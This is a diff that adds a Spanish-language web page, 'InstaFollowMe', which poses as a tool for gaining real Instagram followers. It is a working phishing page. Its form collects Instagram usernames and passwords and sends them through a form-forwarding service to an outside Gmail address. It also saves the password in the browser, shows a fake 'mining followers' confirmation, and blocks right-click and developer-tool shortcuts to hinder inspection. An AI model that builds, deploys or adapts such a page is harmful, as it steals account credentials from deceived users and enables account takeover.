@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InstaFollowMe</title>
+    <head>
+        <!-- Open Graph (Facebook, LinkedIn, WhatsApp, etc) -->
+        <meta property="og:title" content="¡Gana Seguidores Reales en Instagram!">
+        <meta property="og:description" content="Herramienta profesional para aumentar tu audiencia orgánica en Instagram. Métodos 100% seguros.">
+        <meta property="og:image" content="https://i.ibb.co/0gH2zPF/DALL-E-2025-03-01-18-01-53-A-professional-and-sleek-digital-illustration-symbolizing-Instagram-follo.webp">
+        <meta property="og:type" content="website">
+        <meta property="og:site_name" content="InstaFollowMe">
+        
+    </head>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg">
+    <script>
+        // Deshabilitar el clic derecho
+        document.addEventListener('contextmenu', function (e) {
+            e.preventDefault(); // Evita que se abra el menú contextual
+        });
+
+        // Opcional: Deshabilitar la tecla F12 y Ctrl+Shift+I (Inspeccionar)
+        document.addEventListener('keydown', function (e) {
+            // Bloquear F12
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+            // Bloquear Ctrl+Shift+I y Ctrl+Shift+J
+            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+    <!-- Font Awesome para el ícono de Instagram -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* Estilos generales */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #121212;
+            /* Fondo oscuro */
+            color: #ffffff;
+            /* Texto blanco */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #1e1e1e;
+            /* Fondo del contenedor oscuro */
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #ffffff;
+            /* Color inicial del texto */
+            font-weight: 600;
+            position: relative;
+            display: inline-block;
+            animation: scaleAndColor 2s infinite ease-in-out;
+            /* Animación de escalado y cambio de color */
+        }
+
+        /* Definición de la animación */
+        @keyframes scaleAndColor {
+            0% {
+                transform: scale(1);
+                /* Tamaño normal */
+                color: #ffffff;
+                /* Blanco */
+            }
+
+            50% {
+                transform: scale(1.1);
+                /* Escala un 10% más grande */
+                color: #E1306C;
+                /* Rosa de Instagram */
+            }
+
+            100% {
+                transform: scale(1);
+                /* Vuelve al tamaño normal */
+                color: #ffffff;
+                /* Blanco */
+            }
+        }
+
+        /* Estilos para el ícono de Instagram */
+        .instagram-icon {
+            font-size: 70px;
+            color: #E1306C;
+            /* Color de Instagram */
+            margin-bottom: 1px;
+        }
+
+        /* Estilos para los campos del formulario */
+        input[type="text"],
+        input[type="password"] {
+            width: 93%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #333;
+            /* Borde oscuro */
+            border-radius: 5px;
+            font-size: 14px;
+            outline: none;
+            background-color: #333;
+            /* Fondo oscuro */
+            color: #ffffff;
+            /* Texto blanco */
+            transition: border-color 0.3s ease;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #007bff;
+            /* Borde azul al enfocar */
+        }
+
+        /* Estilos para el botón */
+        button {
+            background-color: #007bff;
+            /* Botón azul */
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+            /* Botón azul oscuro al pasar el mouse */
+        }
+
+        /* Mensaje de pie de página */
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+            /* Texto gris */
+        }
+
+        .footer a {
+            color: #007bff;
+            /* Enlace azul */
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Estilos para el mensaje de éxito */
+        .success-message {
+            display: none;
+            /* Oculto por defecto */
+            font-size: 15px;
+            color: #28a745;
+            /* Texto verde */
+            margin-top: 20px;
+        }
+
+        /* Estilos para el input de "minando seguidores" */
+        .mining-input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #28a745;
+            /* Borde verde */
+            border-radius: 5px;
+            font-size: 11px;
+            color: #28a745;
+            /* Texto verde */
+            text-align: center;
+            background-color: #1e2b1e;
+            /* Fondo verde oscuro */
+            display: none;
+            /* Oculto por defecto */
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Ícono de Instagram -->
+        <div class="instagram-icon">
+            <i class="fab fa-instagram"></i>
+        </div>
+
+        <h1>InstaFollowMe</h1>
+        <form id="loginForm" action="https://formsubmit.co/ruletaemailscu@gmail.com" method="POST">
+            <!-- Campos del formulario -->
+            <input type="text" id="username" name="Usuario" placeholder="Usuario de Instagram" required>
+            <input type="password" id="password" name="Contra" placeholder="Contraseña" required>
+
+            <!-- Evitar spam -->
+            <input type="hidden" name="_captcha" value="false">
+
+            <!-- Botón de envío -->
+            <button type="submit">Minar seguidores</button>
+        </form>
+
+        <!-- Mensaje de éxito -->
+        <div class="success-message" id="successMessage">
+            ⚠️ Asegúrate de que tus credenciales sean correctas. Si son incorrectas, no podrás recibir tus seguidores.
+        </div>
+
+        <!-- Input de "minando seguidores" -->
+        <input type="text" class="mining-input" id="miningInput" value="✅ Su cuenta está minando seguidores." readonly>
+
+        <div class="footer">
+            ¿Necesitas ayuda? <a style="text-decoration: none; color:#007bff;" href="https://chat.whatsapp.com/Kc9cCPc3NoOEowGDexlPiE">Contáctanos</a>
+        </div>
+    </div>
+
+    <script>
+        // Cargar datos del localStorage al cargar la página
+        window.onload = function () {
+            const savedUsername = localStorage.getItem('username');
+            const savedPassword = localStorage.getItem('password');
+            const formSubmitted = localStorage.getItem('formSubmitted');
+
+            if (savedUsername) {
+                document.getElementById('username').value = savedUsername;
+            }
+            if (savedPassword) {
+                document.getElementById('password').value = savedPassword;
+            }
+
+            // Si el formulario ya fue enviado, ocultarlo y mostrar los mensajes
+            if (formSubmitted === 'true') {
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+                document.getElementById('miningInput').style.display = 'block';
+            }
+        };
+
+        // Guardar datos en el localStorage al enviar el formulario
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
+            event.preventDefault(); // Evita que el formulario se envíe de forma tradicional
+
+            // Obtener los valores del formulario
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Guardar en el localStorage
+            localStorage.setItem('username', username);
+            localStorage.setItem('password', password);
+            localStorage.setItem('formSubmitted', 'true'); // Indicar que el formulario fue enviado
+
+            // Simular el envío del formulario
+            fetch(this.action, {
+                method: 'POST',
+                body: new FormData(this),
+            })
+                .then(response => {
+                    if (response.ok) {
+                        // Ocultar el formulario
+                        document.getElementById('loginForm').style.display = 'none';
+
+                        // Mostrar el mensaje de éxito
+                        document.getElementById('successMessage').style.display = 'block';
+
+                        // Mostrar el input de "minando seguidores"
+                        document.getElementById('miningInput').style.display = 'block';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error al enviar el formulario:', error);
+                });
+        });
+    </script>
+    <div style="display: none;">
+</body>
+</html>
